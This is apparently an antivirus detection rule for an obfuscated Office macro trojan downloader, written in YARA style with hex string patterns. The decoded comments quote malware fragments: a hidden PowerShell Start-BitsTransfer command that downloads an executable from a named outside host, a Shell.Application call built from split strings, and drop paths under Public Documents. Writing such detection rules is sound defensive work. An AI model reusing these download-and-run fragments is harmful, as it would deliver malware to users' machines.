
rule TrojanDownloader_O97M_Obfuse_PSTD_MTB{
	meta:
		description = "TrojanDownloader:O97M/Obfuse.PSTD!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,05 00 05 00 05 00 00 "
		
	strings :
		$a_01_0 = {26 20 22 20 2d 77 20 68 20 53 74 61 72 74 2d 42 69 74 73 54 72 61 6e 73 66 65 72 20 2d 53 6f 75 72 63 65 20 68 74 74 60 70 3a 2f 2f 71 64 79 68 79 67 6d 2e 63 6f 6d 2f 77 70 2d 63 6f 6e 74 65 6e 74 2f 70 6c 75 67 69 6e 73 2f 6d 61 73 74 65 72 78 2f 4e 65 77 5f 52 65 71 75 65 73 74 73 5f 31 32 30 33 38 30 32 49 4d 47 2e 65 60 78 65 22 20 26 20 22 20 2d 44 65 73 74 69 6e 61 74 69 6f 6e } //1 & " -w h Start-BitsTransfer -Source htt`p://qdyhygm.com/wp-content/plugins/masterx/New_Requests_1203802IMG.e`xe" & " -Destination
		$a_01_1 = {43 3a 5c 55 73 65 72 73 5c 50 75 62 6c 69 63 5c 44 6f 63 75 6d 65 6e 74 73 5c 79 61 72 64 6c 65 61 64 2e 65 60 78 65 } //1 C:\Users\Public\Documents\yardlead.e`xe
		$a_01_2 = {3d 20 22 53 68 65 22 } //1 = "She"
		$a_01_3 = {3d 20 43 72 65 61 74 65 4f 62 6a 65 63 74 28 73 68 65 65 65 20 26 20 22 6c 6c 2e 41 70 70 6c 69 63 61 74 69 6f 6e 22 29 2e 4f 70 65 6e 28 74 68 6f 75 73 61 6e 64 70 65 6f 70 6c 65 } //1 = CreateObject(sheee & "ll.Application").Open(thousandpeople
		$a_01_4 = {3d 20 22 43 3a 5c 55 73 65 72 73 5c 50 75 62 6c 69 63 5c 44 6f 63 75 6d 65 6e 74 73 5c 73 74 75 64 79 74 6f 6e 69 67 68 74 2e 62 61 74 } //1 = "C:\Users\Public\Documents\studytonight.bat
	condition:
		((#a_01_0  & 1)*1+(#a_01_1  & 1)*1+(#a_01_2  & 1)*1+(#a_01_3  & 1)*1+(#a_01_4  & 1)*1) >=5
 
}